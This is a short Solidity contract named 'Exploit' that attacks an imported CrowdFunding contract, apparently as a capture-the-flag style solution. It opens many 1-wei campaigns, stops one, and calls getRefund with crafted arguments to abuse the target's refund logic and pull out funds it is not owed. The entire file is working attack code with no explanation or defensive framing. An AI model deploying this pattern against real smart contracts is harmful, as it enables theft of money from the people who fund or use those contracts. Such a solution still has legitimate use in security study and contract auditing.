pragma solidity 0.8.4;

import './CrowdFunding.sol';

contract Exploit {
    address owner;
    CrowdFunding instance;
    constructor(address _instance) payable {
        owner = msg.sender;
        instance = CrowdFunding(_instance);
    }

    function finalize() external payable {
        require(msg.sender == owner, "not owner");
        require(msg.value >= 2 wei, "cheap");
        uint256 k = msg.value;
        for (uint256 i = 0; i < k; i++) {
            instance.startCampaign{value: 1 wei}();
        }
        instance.stopCampaign{value: 0 wei}(k - 1);
        instance.getRefund{value: 1 wei}(k - 1, 0);
    }

    receive() external payable {

    }
}
